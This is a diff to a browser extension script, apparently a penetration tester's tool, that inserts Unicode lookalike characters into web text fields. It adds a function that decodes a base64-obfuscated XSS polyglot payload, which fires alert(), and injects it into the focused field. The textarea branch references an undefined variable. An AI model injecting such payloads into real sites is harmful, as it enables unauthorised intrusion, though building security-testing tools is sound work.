@@ -1,6 +1,52 @@
 //Nuance content script for inserting bold and italic unicode equivalents into text fields where there is no markdown control
 //made by pn-tester 
 
+function insertXSSPolyglot() {
+  const selectedText = window.getSelection().toString();
+
+  if (selectedText) {
+
+    const base64EncodedBlob = 'amFWYXNDcmlwdDovKi0vKmAvKlxgLyonLyoiLyoqLygvKiAqL29OY2xpQ2s9YWxlcnQoKSApLy8lMEQlMEElMGQlMGEvLzwvc3RZbGUvPC90aXRMZS88L3RlWHRhckVhLzwvc2NSaXB0Ly0tIT5ceDNjc1ZnLzxzVmcvb05sb0FkPWFsZXJ0KCkvLz5ceDNlDQo='; 
+    // Decode the base64 encoded blob
+    const decodedBlob = atob(base64EncodedBlob);
+    // Get the active element where the selected text is located
+    const activeElement = document.activeElement;
+
+    if (activeElement) {
+      if (activeElement.tagName === 'DIV' && activeElement.isContentEditable) {
+        // Case 1: The active element is a contenteditable div
+        // create new text node containing the polyglot decoded
+        const newNode = document.createTextNode(decodedBlob);
+
+        // Get the selection range
+        const selection = window.getSelection();
+        if (selection.rangeCount > 0) {
+          const range = selection.getRangeAt(0);
+          range.deleteContents();
+
+          range.insertNode(newNode);
+          range.collapse();
+          
+          // Trigger an input event to update the target element
+          const targetElement = document.getElementsByClassName(document.activeElement.className)[0];
+          targetElement.dispatchEvent(new Event('input'));
+        }
+      } else if (['INPUT', 'TEXTAREA'].includes(activeElement.tagName)) {
+        // Case 2: The active element is an input or textarea
+        const start = activeElement.selectionStart;
+        const end = activeElement.selectionEnd;
+
+        // Append the polyglot to the end of the selected text
+        activeElement.value = decodedBlob;
+
+        // Move the cursor to the end of the inserted content
+        activeElement.selectionStart = start;
+        activeElement.selectionEnd = start + newText.length;
+      }
+    }
+  }
+}
+
 function insertDiacriticalMarkAbove() {
   const selectedText = window.getSelection().toString();
 
@@ -102,7 +148,7 @@ function insertSTIRT() {
   const selectedText = window.getSelection().toString();
 
   if (selectedText) {
-    const stirtMark = '\uFB05'; // Insert the ft mark, which is converted to st when upper() operation occurs in most languages
+    const stirtMark = '\uFB05'; // Insert the ft mark, which is converted to ST when upper() operation occurs in most languages
 
     // Get the active element where the selected text is located
     const activeElement = document.activeElement;
@@ -261,12 +307,19 @@ chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
     } 
     if (message.style === 'STIRT'){
       insertSTIRT();
+      return;
     }
     if (message.style === 'RightLeft'){
       insertRightLeftMark();
+      return;
+    }
+    if (message.style === 'XSS'){
+      insertXSSPolyglot();
+      return;
     }
     else {
       replaceSelectedText(message.style);
+      return;
     }
   }
 });
